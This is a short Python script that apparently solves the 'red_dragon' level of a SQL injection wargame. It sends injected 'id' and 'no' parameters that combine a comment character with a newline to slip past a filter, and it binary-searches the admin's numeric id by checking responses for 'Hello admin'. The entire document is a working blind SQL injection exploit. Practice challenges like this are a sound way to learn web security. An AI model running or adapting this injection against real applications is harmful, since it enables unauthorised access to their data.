import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
cookies = { "PHPSESSID" : "쿠키값" }

def no_crack():
    start, end = 1, 100000000000

    while start <= end:
        mid = (start + end) // 2

        params = { "id" : "'||no=#", "no": "\n{}".format(mid) }
        request = requests.get(url, params=params, cookies=cookies)
        print(mid)

        if "Hello admin" in request.text:
            print("admin 번호:", mid)
            break
        else:
            params = { "id" : "'||no>#", "no": "\n{}".format(mid) }
            request = requests.get(url, params=params, cookies=cookies)

            if "Hello admin" in request.text:
                start = mid
                mid = (mid + end) // 2
            else:
                end = mid
                mid = (start + end) // 2

        if mid == start:
            break

no_crack()